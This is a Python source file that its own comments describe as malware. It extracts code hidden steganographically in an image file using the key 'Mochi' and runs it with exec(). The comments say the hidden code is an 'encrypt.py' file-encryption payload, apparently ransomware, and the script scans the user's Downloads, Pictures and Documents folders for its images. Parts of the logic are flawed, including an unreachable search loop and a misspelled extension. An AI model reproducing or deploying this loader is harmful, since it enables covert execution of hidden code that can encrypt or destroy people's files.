import os
from extract import extract_message


def main():
    # Represents the name of the two images to be scanned for in the downloads directory
    # TODO: Update this to the name of the appropriate images
    image_containing_key: str = "download.jpg"
    image_containing_encryption_code: str = "download2.bpm"

    # Represents whether the two images were found or not
    key_found: bool = False
    code_found: bool = False

    # Scans the Downloads folder to look for the images and applications needed
    # for the malware to remain operational
    whitelist: list[str] = [image_containing_key, image_containing_encryption_code]
    ready_to_attack: bool = key_found and code_found

    # Searches through current directory to find the embedded files
    if os.path.exists(image_containing_key) and os.path.exists(image_containing_encryption_code):
        ready_to_attack = True
    else:
        raise FileNotFoundError(f"Check if the image name/path '{image_containing_key}' or "
                                f"'{image_containing_encryption_code}' exists in the current directory. "
                                f"It could also be that the name fed to the variable in the code needs to be updated "
                                f"or the image specified just doesn't exist.")

    # Determines whether both the key and code were found

    # Retrieves malicious code secretly embedded in one of the images
    code_to_encrypt_files: str = extract_message(image_containing_encryption_code, "Mochi")

    # Have to keep looking for them at all times until both are found
    while not ready_to_attack:
        # Checks to see if the images are in Downloads or if user moved them to
        # another directory
        directories_to_be_searched = [os.path.expanduser("~/Downloads"),
                                      os.path.expanduser("~/Pictures"),
                                      os.path.expanduser("~/Documents")]

        # Looks through all files in a given directory to keep searching for the key and code
        for directory in directories_to_be_searched:
            for _, _, files in os.walk(directory):
                for file in files:
                    if file in whitelist:
                        if file == image_containing_key:
                            key_found = True
                        if file == image_containing_encryption_code:
                            code_found = True
                        ready_to_attack = key_found and code_found
                    print(file)

    # Runs the malicious code (our "encrypt.py")
    if ready_to_attack:
        exec(code_to_encrypt_files)


main()
